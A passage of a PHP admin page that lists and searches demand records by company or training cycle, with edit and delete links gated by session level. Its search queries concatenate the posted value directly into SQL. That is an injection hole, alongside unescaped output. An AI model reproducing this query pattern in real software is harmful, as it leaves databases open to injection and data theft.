                          <td width="30" align="center" class="texte_mini_b">&nbsp;</td>
                          <td width="55">&nbsp;</td>
                        </tr>
                    </table></td>
                  </tr>
                </table>
                  <div id="scroll">
                <?php //
				if (isset($_GET['search'])) {
				
					$campo = $_POST['campo'];
					$valor = $_POST['valor'];
				
					if ($campo == 'empresa') { $result = $db->Execute("SELECT CDE_demandas . id , CDE_demandas . fecha , CDE_empresas . convenio , CDE_cicleform . cicle , CDE_demandas . p_recoge FROM CDE_demandas , CDE_cicleform , CDE_empresas WHERE ( CDE_demandas . empresa = CDE_empresas . id ) AND ( CDE_demandas . cicle = CDE_cicleform . id ) AND ( CDE_empresas . convenio  LIKE '%".$valor."%' ) ORDER BY CDE_demandas . id"); }
					if ($campo == 'cicle') { $result = $db->Execute("SELECT CDE_demandas . id , CDE_demandas . fecha , CDE_empresas . nombre , CDE_cicleform . cicle , CDE_demandas . p_recoge FROM CDE_demandas , CDE_cicleform , CDE_empresas WHERE ( CDE_demandas . empresa = CDE_empresas . id ) AND ( CDE_demandas . cicle = CDE_cicleform . id ) AND ( CDE_cicleform . cicle  LIKE '%".$valor."%' ) ORDER BY CDE_demandas . id"); }
					if ($campo == 'historico') { $result = $db->Execute("SELECT CDE_demandas . id , CDE_demandas . fecha , CDE_empresas . nombre , CDE_cicleform . cicle , CDE_demandas . p_recoge FROM CDE_demandas , CDE_cicleform , CDE_empresas WHERE ( CDE_demandas . empresa = CDE_empresas . id ) AND ( CDE_demandas . cicle = CDE_cicleform . id ) ORDER BY CDE_demandas . id"); }
					if ($campo == 'sin') { $result = $db->Execute("SELECT CDE_demandas . id , CDE_demandas . fecha , CDE_empresas . convenio , CDE_cicleform . cicle , CDE_demandas . p_recoge FROM CDE_demandas , CDE_cicleform , CDE_empresas WHERE ( CDE_demandas . empresa = CDE_empresas . id ) AND ( CDE_demandas . cicle = CDE_cicleform . id ) AND ( CDE_demandas . p_responde = '' ) ORDER BY CDE_demandas . id"); }
				
				} else { 
				
					$result = $db->Execute("SELECT CDE_demandas . id , CDE_demandas . fecha , CDE_empresas . convenio , CDE_cicleform . cicle , CDE_demandas . p_recoge FROM CDE_demandas , CDE_cicleform , CDE_empresas WHERE ( CDE_demandas . empresa = CDE_empresas . id ) AND ( CDE_demandas . cicle = CDE_cicleform . id ) ORDER BY CDE_demandas . id");
						
				} 
				if ($result === false) die("failed");
                
					while (!$result->EOF) {
					
					for ($i=0, $max=$result->FieldCount(); $i < $max; $i++)
					
					$id = $result->fields[0];
					$fecha = $result->fields[1];
					$empresa = $result->fields[2];
					$cicle = $result->fields[3];
					$persona = $result->fields[4];
				
				?>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="24" align="center" bgcolor="#F7F7F7" class="texte_normal_blanco"><table width="640" border="0" cellpadding="0" cellspacing="0" class="texte_mini">
                <tr>
                          <td width="90" align="center" class="texte_mini"><?php echo utf8_encode($fecha) ?></td>
                          <td width="170" align="center" class="texte_mini"><?php echo utf8_encode($empresa) ?></td>
                      <td width="170" align="center" class="texte_mini"><?php echo utf8_encode($cicle) ?></td>
                          <td width="125" align="center" class="texte_mini"><?php echo utf8_encode($persona) ?></td>
                  <td width="29" align="center" class="texte_mini"><a href="javascript:Abrir_ventana('../ficha_demandes.php?id=<?php echo $id ?>')">info</a></td>
        <td width="28" align="center"><?php if ($_SESSION["autentificado"] <= 3) { ?>
                    <a href="index.php?menu=<?php echo $menu ?>&amp;sub=<?php echo $sub ?>&amp;edit=<?php echo $id ?>"><img src="../resources/ico_m_editar.png" width="16" height="16" border="0" /></a>
                              <?php } ?>                          </td>
                        <td width="28" align="center"><?php if ($_SESSION["autentificado"] == 1) { ?>
                          <a href="index.php?menu=<?php echo $menu ?>&amp;sub=<?php echo $sub ?>&amp;borrar=<?php echo $id ?>&amp;tabla=CDE_demandas" onclick="return confirmar('Se borrara definitivamente')"><img src="../resources/ico_m_del.png" width="16" height="16" border="0" /></a>
                  <?php } ?>                          </td>
                      </tr>
                    </table></td>
                  </tr>
                </table>
                <table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="6"></td>
                  </tr>
                </table>
                <?php $result->MoveNext();
				} ?>
				  </div>
				<?php
                break; 
				} ?>
                
                
                
                
                </td>
				</tr>
				</table> 
				<? } break;   
			 
			} 
	?>

</body>
</html>